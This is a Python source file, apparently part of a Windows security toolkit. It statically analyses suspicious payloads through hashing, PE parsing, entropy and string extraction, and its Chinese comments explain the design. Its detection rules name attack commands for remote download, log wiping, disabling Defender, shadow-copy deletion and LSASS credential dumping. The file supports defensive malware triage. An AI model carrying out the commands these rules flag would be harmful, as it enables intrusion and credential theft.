#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""sandbox/payload.py — 载荷的**静态**取证分析（不执行样本）。

设计原则
--------

1. **绝不执行、绝不加载。** 所有分析都是按字节读取 + 纯解析。这里没有
   `subprocess` 去"运行样本"，也没有 `LoadLibrary` 之类的东西。
   唯一的子进程是 PowerShell 的 `Get-AuthenticodeSignature`（只读证书表）。

2. **畸形输入绝不崩溃。** 恶意样本会故意构造畸形 PE 来打崩分析器
   （这是反分析手段之一）。所以每一处偏移读取都走 `_u16/_u32` 这类
   带边界检查的读法，任何异常都被吞掉并记成 `parse_errors`，
   **而不是让整个分析失败**。宁可少几个字段，也不能没有报告。

3. **指标 ≠ 判决。** 本模块给出的是**可验证的观察**（哈希、节区熵、导入表、
   字符串命中），外加一个**打分**。打分只用来排优先级。报告里
   `verdict` 永远写"需人工判断"，不允许出现"这是恶意软件"这种结论 ——
   静态特征无法证明意图，高熵也可能是正常压缩。

为什么不用 pefile / yara
------------------------

本机没有编译环境，也不希望为了分析一个样本再引入第三方依赖（供应链风险 +
部署复杂度）。PE 头解析用 `struct` 就够了：我们要的是节区/导入表/时间戳/熵，
不是完整反汇编。字符串提取同理，`bstrings.exe`（EZTools 自带）作为**可选**
加速器，没有也能跑。

复用的东西
----------

签名查询复用 `tools/proc_watch.signature_status()` —— 那是本项目已经在用的、
带缓存的 Authenticode 查询（`net_sensor` 的签名降级规则用的就是它）。
不去写第二份实现，避免两处结论漂移。
"""

from __future__ import annotations

import hashlib
import json
import math
import os
import re
import struct
import sys
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Sequence, Tuple

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

__all__ = [
    "analyse",
    "hashes",
    "pe_info",
    "extract_strings",
    "find_indicators",
    "render_markdown",
    "PayloadReport",
    "selftest",
]

# --------------------------------------------------------------------------- #
# 可疑指标表
# --------------------------------------------------------------------------- #
# 每张表都是「正则 → 权重 + 说明」。权重不是精确科学，是**排序优先级**：
# 能直接指向攻击基础设施或凭据窃取的给高分，通用的系统工具名给低分。
# 刻意保守：像 "cmd.exe" 这种在正常安装器里也常见，只给 3 分。

_SUSPICIOUS_STRINGS: List[Tuple[str, int, str]] = [
    # 执行/下载类 LOLBin 组合（单看弱，组合看强）
    (r"(?i)powershell(?:\.exe)?\s+.{0,40}-(?:enc|encodedcommand)\b", 35,
     "PowerShell 编码命令（常见于投递与免杀）"),
    (r"(?i)frombase64string", 20, "Base64 解码（常配合编码命令）"),
    (r"(?i)\bcertutil(?:\.exe)?\b.{0,60}-urlcache", 35, "certutil 下载文件"),
    (r"(?i)\bbitsadmin(?:\.exe)?\b.{0,40}/transfer", 30, "bitsadmin 下载文件"),
    (r"(?i)\bmshta(?:\.exe)?\b", 25, "mshta 执行 HTA"),
    (r"(?i)\brundll32(?:\.exe)?\b.{0,40}javascript:", 30, "rundll32 执行脚本"),
    (r"(?i)\bregsvr32(?:\.exe)?\b.{0,60}/i:http", 35, "regsvr32 Squiblydoo 远程脚本"),
    (r"(?i)\bwmic(?:\.exe)?\b.{0,60}process\s+call\s+create", 30, "WMIC 创建进程"),
    # 防御规避
    (r"(?i)vssadmin(?:\.exe)?\s+delete\s+shadows", 40, "删除卷影副本（勒索典型）"),
    (r"(?i)wevtutil(?:\.exe)?\s+cl\b", 35, "清空事件日志"),
    (r"(?i)netsh\s+advfirewall\s+set\s+.*\s+state\s+off", 40, "关闭防火墙"),
    (r"(?i)bcdedit(?:\.exe)?\s+/set\s+.*recoveryenabled\s+no", 30, "禁用恢复模式"),
    (r"(?i)set-mppreference\s+-disablerealtimemonitoring", 40, "关闭 Defender 实时防护"),
    (r"(?i)add-mppreference\s+-exclusionpath", 30, "给 Defender 加排除项"),
    # 凭据访问
    (r"(?i)\bmimikatz\b", 50, "Mimikatz 相关字符串"),
    (r"(?i)sekurlsa|kerberos::golden|lsadump", 50, "凭据转储关键字"),
    (r"(?i)comsvcs\.dll.{0,30,}minidump|procdump.{0,30}lsass", 45, "LSASS 转储"),
    (r"(?i)\bsam\b.{0,20}hive|reg\s+save\s+hkml\\sam", 30, "SAM 配置单元导出"),
    # 持久化
    (r"(?i)currentversion\\+run\b", 10, "引用 Run 自启键"),
    (r"(?i)\bschtasks(?:\.exe)?\b.{0,40}/create", 20, "创建计划任务"),
    (r"(?i)\bsc(?:\.exe)?\b\s+create\b", 20, "创建服务"),
    (r"(?i)startup\\|\\start menu\\programs\\startup", 10, "启动目录"),
    # C2 / 基础设施
    (r"(?i)stratum\+tcp|stratum\+ssl|xmrig|monero", 45, "挖矿协议/矿工程序"),
    (r"(?i)cobaltstrike|beacon\.dll|\bmeterpreter\b|sliver|havoc", 50, "已知 C2 框架字符串"),
    (r"(?i)\b\.onion\b|\btor\b\s+(?:hidden|service)", 25, "Tor 隐藏服务"),
    # 其他
    (r"(?i)readme.{0,20}(?:decrypt|decrypt.*instructions)|your files.*encrypted", 40,
     "勒索信文本"),
    (r"(?i)\bunion\s+select\b|\bor\s+1=1\b", 15, "SQL 注入片段（可能误报）"),
]

#: 导入表里的可疑 API → 权重 + 说明
_SUSPICIOUS_APIS: Dict[str, Tuple[int, str]] = {
    "VirtualAllocEx": (25, "在别的进程里分配内存（进程注入第一步）"),
    "WriteProcessMemory": (30, "写入别的进程内存（注入）"),
    "CreateRemoteThread": (35, "在别的进程里创建线程（注入）"),
    "NtUnmapViewOfSection": (30, "Process Hollowing 常用手法"),
    "SetWindowsHookEx": (20, "全局钩子（可窃取输入）"),
    "QueueUserAPC": (25, "APC 注入"),
    "AdjustTokenPrivileges": (20, "提权助手（常配合 SeDebugPrivilege）"),
    "OpenProcessToken": (10, "打开进程令牌"),
    "MiniDumpWriteDump": (40, "进程内存转储（凭据窃取常见）"),
    "CryptEncrypt": (20, "加密调用（勒索/加壳都可能）"),
    "CryptGenKey": (15, "生成密钥"),
    "URLDownloadToFile": (25, "下载并落盘"),
    "InternetOpenUrl": (15, "网络请求"),
    "WinExec": (10, "执行程序（老 API，新样本少见）"),
    "ShellExecuteA": (5, "执行程序"),
    "WSASocketA": (10, "原始套接字"),
    "RegSetValueEx": (10, "写注册表"),
    "CreateServiceA": (20, "创建服务（持久化）"),
    "SetFileAttributesA": (10, "改文件属性（可能用于隐藏/只读）"),
    "IsDebuggerPresent": (15, "反调试检查"),
    "CheckRemoteDebuggerPresent": (20, "反调试检查"),
    "GetTickCount": (5, "反调试/沙箱延时（弱信号）"),
}

#: 私有/保留地址（报告里要排除，避免把内网地址当 C2 上报）
_PRIVATE_NETS = (
    re.compile(r"^10\."),
    re.compile(r"^192\.168\."),
    re.compile(r"^172\.(?:1[6-9]|2\d|3[01])\."),
    re.compile(r"^127\."),
    re.compile(r"^169\.254\."),
    re.compile(r"^0\."),
    re.compile(r"^255\."),
)

_RE_URL = re.compile(r"(?i)\b(?:https?|ftp|tcp)://[^\s\"'<>|]{4,}")
_RE_IPV4 = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
_RE_DOMAIN = re.compile(r"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+"
                        r"(?:com|net|org|ru|cn|top|xyz|info|biz|io|cc|tk|pw|onion|su|me)\b",
                        re.IGNORECASE)

# 字符串提取的默认上限。一个 200 MB 的样本不该把内存打满。
_STR_MAX_BYTES = 64 * 1024 * 1024
_STR_MIN_LEN = 6
_STR_LIMIT = 4000
_STR_UTF16 = True


def _harden_console() -> None:
    """把 stdout/stderr 的错误处理器改成 ``replace``。

    为什么必需：载荷里提取出来的字符串**什么都可能有**（任意 Unicode 码位、
    私有区字符、半个代理对）。Windows 控制台默认是 GBK，打印这些字符会直接
    `UnicodeEncodeError` —— 分析跑到一半崩在"打印报告"上，而真正的原因跟
    分析无关。自检里实测撞到过：提取出的中文路径让 selftest 崩掉，
    看起来像掩码写错了。

    注意：这里**不动编码**（只换错误处理器），所以中文照常显示，
    只有 GBK 表示不了的字符会变成 `?`。
    """
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(errors="replace")  # type: ignore[union-attr]
        except Exception:  # noqa: BLE001  （非 TTY / 老版本 Python）
            pass


def _safe(s: Any) -> str:
    """把任意文本转成「控制台一定能打印」的形式（供自检输出用）。"""
    enc = getattr(sys.stdout, "encoding", None) or "utf-8"
    try:
        return str(s).encode(enc, errors="replace").decode(enc, errors="replace")
    except Exception:  # noqa: BLE001
        return "<无法显示>"


# --------------------------------------------------------------------------- #
# 字节读取（全部带边界检查）
# --------------------------------------------------------------------------- #

def _u16(b: bytes, off: int) -> int:
    if off < 0 or off + 2 > len(b):
        return 0
    return struct.unpack_from("<H", b, off)[0]


def _u32(b: bytes, off: int) -> int:
    if off < 0 or off + 4 > len(b):
        return 0
    return struct.unpack_from("<I", b, off)[0]


def _cstr(b: bytes, off: int, limit: int = 512) -> str:
    if off < 0 or off >= len(b):
        return ""
    end = b.find(b"\x00", off)
    if end < 0 or end - off > limit:
        end = min(len(b), off + limit)
    return b[off:end].decode("latin-1", errors="replace")


# --------------------------------------------------------------------------- #
# 哈希与熵
# --------------------------------------------------------------------------- #

def hashes(path: str | Path, chunk: int = 1024 * 1024) -> Dict[str, Any]:
    """流式算 md5/sha1/sha256 + 大小。

    为什么要三个哈希：SHA-256 是现代 IOC 交换的标准（VirusTotal、MISP 都用它），
    MD5/SHA-1 是为了跟**老平台和老报告**对得上（很多内部平台仍按 MD5 检索）。
    三个都要，比只存 sha256 再被问"MD5 多少"要省事。
    """
    p = Path(path)
    md5, sha1, sha256 = hashlib.md5(), hashlib.sha1(), hashlib.sha256()
    size = 0
    with p.open("rb") as fh:
        while True:
            block = fh.read(chunk)
            if not block:
                break
            size += len(block)
            md5.update(block)
            sha1.update(block)
            sha256.update(block)
    return {"md5": md5.hexdigest(), "sha1": sha1.hexdigest(),
            "sha256": sha256.hexdigest(), "size": size}


def shannon_entropy(data: bytes) -> float:
    """香农熵（0~8）。>7 通常意味着已压缩或加密。"""
    if not data:
        return 0.0
    counts = [0] * 256
    for byte in data:
        counts[byte] += 1
    n = len(data)
    ent = 0.0
    for c in counts:
        if c:
            p = c / n
            ent -= p * math.log2(p)
    return round(ent, 4)


# --------------------------------------------------------------------------- #
# PE 解析
# --------------------------------------------------------------------------- #
#: 节区可写/可执行标志
_SCN_MEM_EXECUTE = 0x20000000
_SCN_MEM_READ = 0x40000000
_SCN_MEM_WRITE = 0x80000000

_MACHINE = {0x014C: "I386", 0x8664: "AMD64", 0x01C0: "ARM", 0xAA64: "ARM64",
            0x0200: "IA64"}
_SUBSYSTEM = {1: "NATIVE", 2: "WINDOWS_GUI", 3: "WINDOWS_CUI", 9: "WINDOWS_CE_GUI",
              10: "EFI_APPLICATION"}


def pe_info(path: str | Path, max_read: int = 32 * 1024 * 1024) -> Optional[Dict[str, Any]]:
    """解析 PE 头。**不是 PE 就返回 None；畸形就返回已解析到的部分 + parse_errors。**

    返回字段刻意选「能支撑判断」的那几个：
      * 编译时间戳（可被伪造，但和文件时间戳矛盾时很有价值）
      * 节区表 + 每节熵（熵高 = 该节被压缩/加密，是加壳的强信号）
      * 同时具备写+执行权限的节区（WX 节，常见于运行时解密自身代码的样本）
      * 导入 DLL 与可疑 API
      * overlay（最后一个节区之后还有数据 = 常被用来藏第二段载荷）

    ⚠ 这些全是**指示器**。加壳也可能只是商业保护（VMProtect/Themida 的合法用途），
    WX 节在 JIT 编译器里也正常。
    """
    p = Path(path)
    try:
        with p.open("rb") as fh:
            data = fh.read(max_read)
    except OSError as exc:
        return {"is_pe": False, "error": f"读取失败：{exc}"}

    errors: List[str] = []
    if len(data) < 0x40 or data[:2] != b"MZ":
        return {"is_pe": False, "error": "不是 MZ 可执行文件"}

    e_lfanew = _u32(data, 0x3C)
    if e_lfanew <= 0 or e_lfanew + 24 > len(data) or data[e_lfanew:e_lfanew + 4] != b"PE\0\0":
        return {"is_pe": False, "error": f"PE 签名无效（e_lfanew={e_lfanew}）"}

    coff = e_lfanew + 4
    machine = _u16(data, coff)
    n_sections = _u16(data, coff + 2)
    timestamp = _u32(data, coff + 4)
    size_opt = _u16(data, coff + 16)
    characteristics = _u16(data, coff + 18)

    opt = coff + 20
    magic = _u16(data, opt)
    is_pe32_plus = (magic == 0x20B)
    if magic not in (0x10B, 0x20B):
        errors.append(f"未知 optional header magic 0x{magic:04x}")

    entry = _u32(data, opt + 16)
    image_base = (_u32(data, opt + 24) if not is_pe32_plus
                  else struct.unpack_from("<Q", data, opt + 24)[0]) if opt + 32 <= len(data) else 0
    subsystem = _u16(data, opt + 68)
    dll_chars = _u16(data, opt + 70)
    n_rva = _u32(data, opt + (92 if not is_pe32_plus else 108))
    dd_off = opt + (96 if not is_pe32_plus else 112)

    # 节区表
    sec_off = opt + size_opt
    sections: List[Dict[str, Any]] = []
    for i in range(n_sections):
        base = sec_off + i * 40
        if base + 40 > len(data):
            errors.append(f"节区 {i} 越界（表被截断）")
            break
        name = data[base:base + 8].rstrip(b"\x00").decode("latin-1", errors="replace")
        vsize = _u32(data, base + 8)
        vaddr = _u32(data, base + 12)
        rawsize = _u32(data, base + 16)
        rawptr = _u32(data, base + 20)
        chars = _u32(data, base + 36)
        raw = b""
        if rawptr and rawsize and rawptr + rawsize <= len(data):
            raw = data[rawptr:rawptr + rawsize]
        elif rawptr and rawsize:
            errors.append(f"节区 {name} 原始数据越界（声明 {rawsize} 字节）")
        sections.append({
            "name": name,
            "virtual_address": vaddr,
            "virtual_size": vsize,
            "raw_size": rawsize,
            "raw_ptr": rawptr,
            "entropy": shannon_entropy(raw) if raw else None,
            "executable": bool(chars & _SCN_MEM_EXECUTE),
            "writable": bool(chars & _SCN_MEM_WRITE),
            "readable": bool(chars & _SCN_MEM_READ),
        })

    # overlay：最后一个节区之后的数据
    overlay = 0
    if sections:
        last = max(sections, key=lambda s: (s["raw_ptr"] or 0) + (s["raw_size"] or 0))
        end = (last["raw_ptr"] or 0) + (last["raw_size"] or 0)
        if 0 < end < len(data):
            overlay = len(data) - end

    # 导入表
    imports: List[str] = []
    imported_apis: List[str] = []
    try:
        imports, imported_apis = _parse_imports(data, sections, dd_off, n_rva, is_pe32_plus)
    except Exception as exc:  # noqa: BLE001  恶意样本会故意构造畸形导入表
        errors.append(f"导入表解析异常（已忽略）：{type(exc).__name__}: {exc}")

    return {
        "is_pe": True,
        "machine": _MACHINE.get(machine, f"0x{machine:04x}"),
        "subsystem": _SUBSYSTEM.get(subsystem, str(subsystem)),
        "is_64bit": is_pe32_plus,
        "is_dll": bool(characteristics & 0x2000),
        "characteristics": f"0x{characteristics:04x}",
        "dll_characteristics": f"0x{dll_chars:04x}",
        "has_aslr": bool(dll_chars & 0x0040),
        "has_dep": bool(dll_chars & 0x0100),
        "has_cfg": bool(dll_chars & 0x4000),
        "compile_time_utc": (time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(timestamp))
                             if 0 < timestamp < 0x7FFFFFFF else ""),
        "compile_timestamp": timestamp,
        "entry_point_rva": entry,
        "image_base": image_base,
        "sections": sections,
        "section_count": len(sections),
        "n_rva_and_sizes": n_rva,
        "overlay_bytes": overlay,
        "imports": imports,
        "imported_apis": imported_apis,
        "parse_errors": errors,
    }


def _rva_to_off(rva: int, sections: Sequence[Dict[str, Any]]) -> Optional[int]:
    """RVA → 文件偏移。落在任何节区之外就返回 None。"""
    for s in sections:
        start = s["virtual_address"]
        size = max(s["virtual_size"], s["raw_size"])
        if start <= rva < start + size:
            delta = rva - start
            if delta < s["raw_size"]:
                return (s["raw_ptr"] or 0) + delta
    return None


def _parse_imports(data: bytes, sections: Sequence[Dict[str, Any]], dd_off: int,
                   n_rva: int, is_pe32_plus: bool) -> Tuple[List[str], List[str]]:
    """解析导入 DLL 名与部分 API 名。"""
    if n_rva < 2:
        return [], []
    imp_rva = _u32(data, dd_off + 8)      # DataDirectory[1] = Import Table
    if not imp_rva:
        return [], []
    off = _rva_to_off(imp_rva, sections)
    if off is None:
        return [], []

    thunk_size = 8 if is_pe32_plus else 4
    ordinal_flag = (1 << 63) if is_pe32_plus else (1 << 31)
    dlls: List[str] = []
    apis: List[str] = []
    for i in range(256):                  # 上限防死循环
        base = off + i * 20
        if base + 20 > len(data):
            break
        name_rva = _u32(data, base + 12)
        orig_first = _u32(data, base + 16)
        if not (name_rva or orig_first):
            break
        n_off = _rva_to_off(name_rva, sections)
        if n_off is not None:
            dlls.append(_cstr(data, n_off, 128))
        # 原始 thunk 表里逐条取函数名
        t_rva = orig_first
        t_off = _rva_to_off(t_rva, sections) if t_rva else None
        if t_off is not None and len(apis) < 400:
            for j in range(64):
                pos = t_off + j * thunk_size
                if pos + thunk_size > len(data):
                    break
                val = struct.unpack_from("<Q" if is_pe32_plus else "<I", data, pos)[0]
                if val == 0:
                    break
                if val & ordinal_flag:
                    continue
                hint_off = _rva_to_off(val & 0x7FFFFFFF, sections)
                if hint_off is None or hint_off + 2 > len(data):
                    continue
                apis.append(_cstr(data, hint_off + 2, 128))
    return dlls, apis


# --------------------------------------------------------------------------- #
# 字符串提取
# --------------------------------------------------------------------------- #

def extract_strings(path: str | Path, min_len: int = _STR_MIN_LEN,
                    limit: int = _STR_LIMIT, max_bytes: int = _STR_MAX_BYTES,
                    include_utf16: bool = _STR_UTF16) -> Dict[str, Any]:
    """提取 ASCII 与 UTF-16LE 字符串。

    为什么两种都要：Windows 上的字符串常量常常是宽字符（UTF-16LE），
    只提 ASCII 会漏掉一大半 PowerShell 命令行、URL 和注册表路径 —— 实测里
    `powershell -enc` 这类关键命令在宽字符区就出现过。

    为什么封顶：样本可能是 200 MB 的打包文件，全量提字符串会把内存打满，
    而分析价值并没有随体积线性增长。超限时如实标注 `truncated`。
    """
    p = Path(path)
    size = p.stat().st_size
    with p.open("rb") as fh:
        data = fh.read(max_bytes)
    truncated = size > len(data)

    ascii_re = re.compile(rb"[\x20-\x7e]{%d,}" % min_len)
    found: List[str] = []
    for m in ascii_re.finditer(data):
        found.append(m.group().decode("latin-1"))
        if len(found) >= limit:
            break

    utf16 = 0
    if include_utf16 and len(found) < limit:
        # UTF-16LE 分三趟。为什么不是一趟：三种情况的**字节形状**互不相容。
        #
        #   趟 1：ASCII 内容的宽字符形式，形如 41 00 42 00 —— 用
        #          `[\x20-\x7e]\x00` 在**原始缓冲区**上匹配。
        #          在原始缓冲区上匹配天然与对齐无关，所以这一趟不受下面那个坑影响。
        #          PowerShell 命令行、URL、注册表路径大多走这一趟。
        #
        #   趟 2/3：**非 ASCII 的宽字符**（中文路径等）。这类字符高字节不是 0x00，
        #          趟 1 完全看不到。自检时才发现这个缺口，而这台机器上就有真实例子：
        #          注册表 Run 项里出现过 `...\MeijuStory_Demo\妹居物语.exe`。
        #          做法是在**高字节**上找 CJK 连续区再回原缓冲区切片解码。
        #
        # ⚠ 趟 2/3 必须跑**两种对齐**（偏移 0 与偏移 1）。踩过的坑：最初只按
        #   `data[1::2]` 取高字节，等价于假设宽字符串总从偶数偏移开始。但真实样本里
        #   对齐是任意的 —— 前面只要有一段长度为奇数的 ASCII，后面的宽字符串就整体错位，
        #   于是字节对被读错，产出 `瀀漀眀攀爀猀栀攀氀氀`（把 "powershell" 的高字节当低字节）
        #   这种垃圾字符串，混进报告里既误导人又淹没有效信息。
        #   代价只有两倍的正则扫描（都是 C 层切片与匹配，不是 Python 逐字节循环）。
        u16_re = re.compile(rb"(?:[\x20-\x7e]\x00){%d,}" % min_len)
        for m in u16_re.finditer(data):
            found.append(m.group().decode("utf-16-le", errors="replace"))
            utf16 += 1
            if len(found) >= limit:
                break

        if len(found) < limit:
            # CJK 连续区的长度阈值比 ASCII 小：`min_len` 是给 ASCII 定的，
            # 而中文一个字符的信息量远大于一个 ASCII 字符，且中文常出现在
            # 路径/注册表键的名字段里（前后是 ASCII，所以只会剩下短短一截）。
            # 实测漏报例：`同步空间` 只有 4 个字，按 6 的门槛会被整段丢掉。
            cjk_min = max(3, min_len // 3)
            cjk_re = re.compile(rb"[\x34-\x9f\xff]{%d,}" % cjk_min)
            for buf in (data, data[1:]):
                if len(found) >= limit:
                    break
                high = buf[1::2]
                for m in cjk_re.finditer(high):
                    start, end = m.span()
                    found.append(buf[start * 2:end * 2].decode("utf-16-le",
                                                              errors="replace"))
                    utf16 += 1
                    if len(found) >= limit:
                        break

    return {"strings": found, "count": len(found), "utf16_hits": utf16,
            "truncated": truncated, "scanned_bytes": len(data)}


def find_indicators(strings: Sequence[str]) -> Dict[str, Any]:
    """在字符串里找可疑指标。返回分组命中 + 打分。

    分组的意义：`urls` / `ips` / `registry` 这类是**可核对的观察**，
    可以拿去查情报平台；`hits` 是规则命中，用于排序。
    """
    blob = "\n".join(strings)
    hits: List[Dict[str, Any]] = []
    score = 0

    for pattern, weight, why in _SUSPICIOUS_STRINGS:
        try:
            m = re.search(pattern, blob)
        except re.error:
            continue
        if m:
            score += weight
            hits.append({"pattern": pattern, "weight": weight, "why": why,
                         "sample": blob[max(0, m.start()):m.start() + 120].replace("\n", " ")})

    urls = sorted({u.rstrip(".,;)'\"") for u in _RE_URL.findall(blob)})[:40]
    ips = sorted({ip for ip in _RE_IPV4.findall(blob) if _is_routable_ip(ip)})[:40]
    domains = sorted({d.lower() for d in _RE_DOMAIN.findall(blob)
                      if not d.lower().endswith(".dll")})[:40]

    return {"score": min(score, 100), "hits": hits, "urls": urls, "ips": ips,
            "domains": domains}


def _is_routable_ip(ip: str) -> bool:
    """排除私有/保留地址 —— 内网地址不是 C2，报出来只会制造噪音。"""
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    try:
        octets = [int(x) for x in parts]
    except ValueError:
        return False
    if any(o > 255 for o in octets):
        return False
    if octets[3] in (0, 255):
        return False
    return not any(rx.match(ip) for rx in _PRIVATE_NETS)


def _api_hits(imported: Sequence[str]) -> List[Dict[str, Any]]:
    out = []
    have = set(imported)
    for api, (weight, why) in _SUSPICIOUS_APIS.items():
        if api in have:
            out.append({"api": api, "weight": weight, "why": why})
    return sorted(out, key=lambda d: -d["weight"])


def _pe_anomalies(pe: Dict[str, Any]) -> List[Dict[str, Any]]:
    """从 PE 结构里提炼出可解释的异常。每条都带 `why`，便于人工复核。"""
    out: List[Dict[str, Any]] = []
    if not pe or not pe.get("is_pe"):
        return out

    for s in pe.get("sections") or []:
        ent = s.get("entropy")
        if ent is not None and ent >= 7.2:
            out.append({"weight": 25, "why": f"节区 {s['name']} 熵 {ent}（≥7.2，疑似压缩/加密/加壳）"})
        if s.get("executable") and s.get("writable"):
            out.append({"weight": 30,
                        "why": f"节区 {s['name']} 同时可写可执行（运行时自解密代码的常见特征）"})

    if not (pe.get("imports") or []):
        out.append({"weight": 20, "why": "没有导入表（可能是加壳/手工映射加载）"})

    ts = pe.get("compile_timestamp") or 0
    if ts == 0:
        out.append({"weight": 10, "why": "编译时间戳为 0（被清空，常见于免杀处理）"})
    elif ts > time.time() + 86400 * 30:
        out.append({"weight": 25, "why": "编译时间戳在未来（明显伪造）"})

    if pe.get("overlay_bytes", 0) > 4096:
        out.append({"weight": 15, "why": f"末尾有 {pe['overlay_bytes']} 字节额外数据（可藏第二段载荷）"})

    if not pe.get("has_aslr"):
        out.append({"weight": 10, "why": "未启用 ASLR（DllCharacteristics 无 DYNAMIC_BASE）"})
    if not pe.get("has_dep"):
        out.append({"weight": 10, "why": "未启用 DEP/NX"})

    return out


# --------------------------------------------------------------------------- #
# 报告
# --------------------------------------------------------------------------- #

@dataclass
class PayloadReport:
    path: str = ""
    analysed_at: str = ""
    hashes: Dict[str, Any] = field(default_factory=dict)
    file_type: str = ""
    entropy: float = 0.0
    signature: Dict[str, Any] = field(default_factory=dict)
    pe: Optional[Dict[str, Any]] = None
    anomalies: List[Dict[str, Any]] = field(default_factory=list)
    api_hits: List[Dict[str, Any]] = field(default_factory=list)
    indicators: Dict[str, Any] = field(default_factory=dict)
    string_count: int = 0
    strings_truncated: bool = False
    risk: str = "unknown"
    score: int = 0
    verdict: str = ""
    notes: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    def to_json(self, indent: int = 2) -> str:
        return json.dumps(self.to_dict(), ensure_ascii=False, indent=indent)


def _classify_type(pe: Optional[Dict[str, Any]], path: Path) -> str:
    if pe and pe.get("is_pe"):
        kind = "DLL" if pe.get("is_dll") else "EXE"
        return f"PE32{'+' if pe.get('is_64bit') else ''} {kind} ({pe.get('machine')})"
    head = b""
    try:
        with Path(path).open("rb") as fh:
            head = fh.read(8)
    except OSError:
        pass
    if head.startswith(b"#!") or head.startswith(b"#!/"):
        return "脚本（shebang）"
    if head.startswith(b"MZ"):
        return "DOS/NE（非 PE）"
    low = Path(path).suffix.lower()
    if low in (".ps1", ".vbs", ".js", ".jse", ".wsf", ".hta", ".bat", ".cmd"):
        return f"脚本（{low}）"
    if head.startswith(b"%PDF"):
        return "PDF"
    if head.startswith(b"PK\x03\x04"):
        return "ZIP/OOXML 容器"
    return "未知/原始数据"


def analyse(path: str | Path, *, with_signature: bool = True,
            with_strings: bool = True, max_strings: int = _STR_LIMIT) -> PayloadReport:
    """对一个载荷做完整静态分析。**不执行、不加载样本。**

    Args:
        with_signature: 是否查 Authenticode 签名（会起一次 PowerShell，约 1~3 秒）
        with_strings:   是否提取并匹配字符串（大文件较慢；可关掉只做结构分析）
        max_strings:    字符串数量上限
    """
    p = Path(path)
    rep = PayloadReport(path=str(p), analysed_at=time.strftime("%Y-%m-%d %H:%M:%S"))
    if not p.is_file():
        rep.errors.append(f"文件不存在或不是普通文件：{p}")
        rep.verdict = "无法分析"
        return rep

    rep.hashes = hashes(p)
    rep.file_type = _classify_type(None, p)

    # 熵：只看前 8 MB 就够判断"整体是不是压缩/加密"，全量读没有额外价值
    try:
        with p.open("rb") as fh:
            rep.entropy = shannon_entropy(fh.read(8 * 1024 * 1024))
    except OSError as exc:
        rep.errors.append(f"读取失败：{exc}")

    rep.pe = pe_info(p)
    rep.file_type = _classify_type(rep.pe, p)
    if rep.pe and rep.pe.get("error"):
        rep.errors.append(f"PE 解析：{rep.pe['error']}")
    if rep.pe and rep.pe.get("parse_errors"):
        rep.errors.extend(f"PE 解析：{e}" for e in rep.pe["parse_errors"])

    rep.anomalies = _pe_anomalies(rep.pe)
    if rep.pe and rep.pe.get("is_pe"):
        rep.api_hits = _api_hits(rep.pe.get("imported_apis") or [])

    if with_strings:
        try:
            st = extract_strings(p, limit=max_strings)
            rep.string_count = st["count"]
            rep.strings_truncated = st["truncated"]
            rep.indicators = find_indicators(st["strings"])
            rep.notes.append(
                f"提取字符串 {st['count']} 条（其中宽字符 {st['utf16_hits']} 条）"
                + ("，**已截断**（样本过大）" if st["truncated"] else ""))
        except Exception as exc:  # noqa: BLE001
            rep.errors.append(f"字符串提取失败：{type(exc).__name__}: {exc}")

    if with_signature:
        try:
            from tools.proc_watch import signature_status  # noqa: PLC0415
            status, subject = signature_status(str(p))
            rep.signature = {"status": status, "signer": subject or ""}
        except Exception as exc:  # noqa: BLE001
            rep.signature = {"status": "UnknownError", "signer": "",
                             "error": f"{type(exc).__name__}: {exc}"}

    # ---- 打分 ----
    score = 0
    score += sum(a["weight"] for a in rep.anomalies)
    score += sum(a["weight"] for a in rep.api_hits)
    score += int((rep.indicators or {}).get("score", 0))
    if rep.entropy >= 7.2:
        score += 15
        rep.notes.append(f"整文件熵 {rep.entropy}（≥7.2，可能整体打包/加密）")

    sig = (rep.signature or {}).get("status", "")
    if sig == "Valid":
        # 签名有效**降低**优先级，但绝不归零：恶意软件也买证书。
        # 这条与 net_sensor 的签名降级是同一套逻辑（那边降 40→10）。
        score = max(0, score - 30)
        rep.notes.append(f"数字签名有效（{rep.signature.get('signer', '')[:60]}）→ 降 30 分。"
                         f"注意：签名有效不等于无害。")
    elif sig in ("HashMismatch", "NotTrusted"):
        score += 25
        rep.notes.append(f"签名状态 {sig} → 加 25 分（签名与内容不符或不受信任的签发者，"
                         f"这是**被篡改的正规程序**的典型特征）")

    rep.score = min(score, 100)
    rep.risk = ("critical" if rep.score >= 70 else
                "high" if rep.score >= 45 else
                "medium" if rep.score >= 25 else "low")

    rep.verdict = ("静态指标显示高度可疑，**但仍需人工确认**。"
                   "静态特征无法证明意图，请结合网络行为与落地物一起判断。"
                   if rep.risk in ("critical", "high")
                   else "静态指标未显示明确恶意特征 —— **这不等于安全**："
                        "加壳/加密/白利用都可能让静态分析失效。")
    return rep


def render_markdown(rep: PayloadReport | Dict[str, Any]) -> str:
    """把报告渲染成 Markdown（给人看，也给模型看）。"""
    d = rep.to_dict() if isinstance(rep, PayloadReport) else rep
    L: List[str] = []
    L.append("# 载荷静态分析报告")
    L.append("")
    L.append(f"- 分析时间：{d.get('analysed_at', '')}")
    L.append(f"- 文件：`{d.get('path', '')}`")
    L.append(f"- 类型：{d.get('file_type', '')}")
    h = d.get("hashes") or {}
    L.append(f"- 大小：{h.get('size', 0)} 字节　熵：{d.get('entropy', 0)}")
    L.append(f"- SHA-256：`{h.get('sha256', '')}`")
    L.append(f"- SHA-1：`{h.get('sha1', '')}`")
    L.append(f"- MD5：`{h.get('md5', '')}`")
    sig = d.get("signature") or {}
    L.append(f"- 数字签名：{sig.get('status', '未查')}　{sig.get('signer', '')}")
    L.append(f"- **风险评级：{d.get('risk', '?')}（{d.get('score', 0)}/100）**")
    L.append("")
    L.append(f"> {d.get('verdict', '')}")
    L.append("")

    notes = d.get("notes") or []
    if notes:
        L.append("## 说明")
        L.extend(f"- {n}" for n in notes)
        L.append("")

    pe = d.get("pe") or {}
    if pe.get("is_pe"):
